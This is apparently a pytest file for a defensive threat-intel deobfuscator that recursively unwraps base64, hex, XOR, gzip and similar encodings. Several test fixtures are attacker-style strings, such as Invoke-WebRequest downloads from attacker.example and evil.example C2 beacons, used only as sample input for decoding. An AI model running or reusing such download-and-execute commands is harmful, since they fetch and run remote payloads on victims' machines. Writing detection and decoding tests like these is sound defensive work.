"""Tests for the CyberChef-Magic-style recursive auto-decoder."""

from __future__ import annotations

import base64
import gzip
import zlib

from intel.deobfuscator import (
    magic_decode, deobfuscate,
    _decode_score, _magic_base64, _magic_rot13, _magic_rot47,
    _magic_reverse, _magic_gzip, _magic_zlib, _magic_xor_brute,
    _magic_hex, _magic_url,
)


# ─── Scoring ────────────────────────────────────────────────────────────────
def test_decode_score_rewards_plaintext_over_random():
    plain  = "the quick brown fox jumps over the lazy dog"
    random = base64.b64encode(b"\x12\x34\x56\x78\xab\xcd\xef\x99" * 8).decode()
    assert _decode_score(plain) > _decode_score(random)


def test_decode_score_zero_for_empty_and_tiny():
    assert _decode_score("") == 0.0
    assert _decode_score("ab") == 0.0


# ─── Single-op decoders ─────────────────────────────────────────────────────
def test_magic_base64_roundtrip():
    plain = "powershell -enc SQBuAHYAbwBrAGUA"
    enc   = base64.b64encode(plain.encode()).decode()
    assert _magic_base64(enc) == plain


def test_magic_base64_rejects_non_base64_input():
    assert _magic_base64("not @# base64!") is None


def test_magic_rot13_roundtrip():
    plain = "Hello World"
    enc   = _magic_rot13(plain)
    assert enc != plain
    assert _magic_rot13(enc) == plain


def test_magic_rot47_roundtrip():
    plain = "Powershell -enc 12345"
    enc   = _magic_rot47(plain)
    assert enc != plain
    assert _magic_rot47(enc) == plain


def test_magic_reverse_is_involutive():
    s = "abcdef12345"
    assert _magic_reverse(_magic_reverse(s)) == s


def test_magic_gzip_roundtrip():
    plain = b"Beacon to evil.example/c2.php" * 3
    enc   = gzip.compress(plain).decode("latin-1")
    out   = _magic_gzip(enc)
    assert plain.decode() in out


def test_magic_zlib_roundtrip():
    plain = b"Cobalt Strike beacon config" * 2
    enc   = zlib.compress(plain).decode("latin-1")
    out   = _magic_zlib(enc)
    assert plain.decode() in out


def test_magic_hex_decodes_continuous_hex_string():
    plain = "Invoke-WebRequest http://evil/x.exe"
    enc   = plain.encode().hex()
    out   = _magic_hex(enc)
    assert out == plain


def test_magic_url_decodes_percent_encoding():
    enc = "Invoke-WebRequest%20http%3A//evil"
    out = _magic_url(enc)
    assert out is not None
    assert "Invoke-WebRequest" in out


def test_magic_xor_brute_finds_single_byte_key():
    plain = ("Invoke-WebRequest http://attacker.example/payload.exe "
             "and write the file to disk for execution")
    key   = 0x37
    enc   = bytes(b ^ key for b in plain.encode()).decode("latin-1")
    out   = _magic_xor_brute(enc)
    assert out is not None
    assert "Invoke-WebRequest" in out


# ─── Recursive magic_decode ────────────────────────────────────────────────
def test_magic_decode_returns_empty_shape_on_no_improvement():
    plain = "the quick brown fox jumps over the lazy dog"
    out   = magic_decode(plain)
    # Already plaintext — no operation should improve the score.
    assert out["chain"] == []
    assert out["improved"] is False


def test_magic_decode_unwraps_single_layer_base64():
    plain = ("Invoke-WebRequest -Uri http://attacker.example/x.exe "
             "and download the malicious payload")
    enc   = base64.b64encode(plain.encode()).decode()
    out   = magic_decode(enc)
    assert out["improved"] is True
    assert len(out["chain"]) >= 1
    assert out["chain"][0]["op"] == "base64"
    assert "Invoke-WebRequest" in out["final_output"]


def test_magic_decode_unwraps_two_layers_base64_of_hex():
    plain  = ("the quick brown fox jumps over the lazy dog "
              "and powers shell from system32 to evil.example")
    layer1 = plain.encode().hex()                          # hex
    layer2 = base64.b64encode(layer1.encode()).decode()    # base64 of hex
    out    = magic_decode(layer2)
    assert out["improved"] is True
    # Chain should include both ops (order: base64 first, then hex).
    ops = [s["op"] for s in out["chain"]]
    assert "base64" in ops
    assert "hex"    in ops
    assert "the quick brown fox" in out["final_output"]


def test_magic_decode_caps_depth():
    plain = "ab" * 100
    out   = magic_decode(plain, max_depth=2)
    assert len(out["chain"]) <= 2


def test_magic_decode_handles_empty_input():
    out = magic_decode("")
    assert out["chain"] == []
    assert out["improved"] is False
    out = magic_decode(None)
    assert out["chain"] == []


# ─── Integration with deobfuscate() ────────────────────────────────────────
def test_deobfuscate_surfaces_magic_chain_when_improved():
    plain = ("Get-Process powershell and download "
             "from http://attacker.example/payload")
    enc   = base64.b64encode(plain.encode()).decode()
    out   = deobfuscate(enc)
    types_detected = {d["type"] for d in out["detected"]}
    types_decoded  = {d["type"] for d in out["decoded"]}
    # Should appear in both detected (with chain summary) and decoded
    # (with the final plaintext).
    assert "magic_chain"  in types_detected
    assert "magic_decode" in types_decoded
    magic_out = next(d for d in out["decoded"] if d["type"] == "magic_decode")
    assert "Get-Process" in magic_out["decoded"]


def test_deobfuscate_does_not_invent_magic_chain_on_plain_input():
    plain = "User SEC\\jsmith ran C:\\Windows\\System32\\notepad.exe at 14:02 UTC"
    out   = deobfuscate(plain)
    types_detected = {d["type"] for d in out["detected"]}
    assert "magic_chain" not in types_detected
